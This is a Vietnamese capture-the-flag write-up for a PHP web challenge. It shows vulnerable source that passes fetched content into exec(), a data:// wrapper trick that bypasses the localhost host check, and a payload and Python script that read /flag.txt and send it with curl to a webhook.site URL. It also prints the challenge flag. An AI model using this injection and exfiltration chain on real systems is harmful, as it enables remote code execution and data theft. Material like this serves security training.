# SAFE CONTENT (MEDIUM)

## PREVIEW 

![image](https://hackmd.io/_uploads/SyDEaWCKA.png)

## SOURCE CODE

```php=
<?php

    function isAllowedIP($url, $allowedHost) {
        $parsedUrl = parse_url($url);
        
        if (!$parsedUrl || !isset($parsedUrl['host'])) {
            return false;
        }
        
        return $parsedUrl['host'] === $allowedHost;
    }

    function fetchContent($url) {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5 // Timeout in seconds
            ]
        ]);

        $content = @file_get_contents($url, false, $context);
        if ($content === FALSE) {
            $error = error_get_last();
            throw new Exception("Unable to fetch content from the URL. Error: " . $error['message']);
        }
        return base64_decode($content);
    }

    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['url'])) {
        $url = $_GET['url'];
        $allowedIP = 'localhost';
        
        if (isAllowedIP($url, $allowedIP)) {
            $content = fetchContent($url);
            // file upload removed due to security issues
            if ($content) {
                $command = 'echo ' . $content . ' | base64 > /tmp/' . date('YmdHis') . '.tfc';
                exec($command . ' > /dev/null 2>&1');
                // this should fix it
            }
        }
    }
?>
```

## EXPLOIT

Phân tích source code thì hàm isAllowedIP nó lấy 2 giá trị là `url` mình đưa vào và `allowHost`. Nó sử dụng hàm `parse_url` để phân tích rồi check xem phần host của url mình cung cấp có bằng allowHost hay không. Hàm `parse_url` sẽ trả về array chứa các key sau.

![image](https://hackmd.io/_uploads/H16uEfCtR.png)

Còn phần bên dưới thì allowIP là localhost, xong rồi lấy content của url đó đưa vào command rồi exec nó. Đoạn này là RCE đích thực rồi vì content này không được lọc mà đưa luôn vào hàm exec. Nhưng mà bypass host thế nào?

Lúc đầu mình cứ nghĩ là làm thế nào để juggling cái hàm `parse_url` kia để mà giá trị host của nó là localhost mà nó sẽ redirect sang web của mình và lấy dữ liệu từ đó để RCE.

Mình quên mất là trong php có 1 số wrapper đặc biệt mà có thể bypass được phần localhost kia. [Reference](https://www.php.net/manual/en/wrappers.php)

Và ở đây mình sẽ sử dụng `data` wrapper với payload sau:
`data://@localhost/plain,cGF5bG9hZF9oZXJl`

![image](https://hackmd.io/_uploads/r1YGImAt0.png)

Xây dựng payload như sau: `'' | cat /flag.txt | curl https://webhook.site/acbd8eda-6f05-4d8e-83da-9c029d5a9dd6 -X POST -d @-`

Lệnh curl dùng POST và `-d` hay `--data` dùng `@-` là lấy stdin chính là `flag.txt` kia. 

![image](https://hackmd.io/_uploads/r15cF5RKR.png)

![image](https://hackmd.io/_uploads/H1ggqqRK0.png)

Flag: `TFCCTF{0cc5c7c5be395bb7e7456224117aed15b7d7f25933e126cecfbff41bff12beeb}`

P/s:
1. Các bạn có thể sử dụng script sau: 

```python=
import requests
import base64

REMOTE = "http://challs.tfcctf.com:32210/"
# Proxies to catch request in Burp
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

payload = b"'' | cat /flag.txt | curl https://webhook.site/acbd8eda-6f05-4d8e-83da-9c029d5a9dd6 -X POST -d @-"
payload = b"data://localhost/," + base64.b64encode(payload)

res = requests.get(REMOTE, params=f'url={payload.decode()}', proxies=proxies)
```

2. Ngoài ra còn 1 cách nữa tại [đây](https://yun.ng/c/ctf/2024-tfcctf/web/safe_content/)
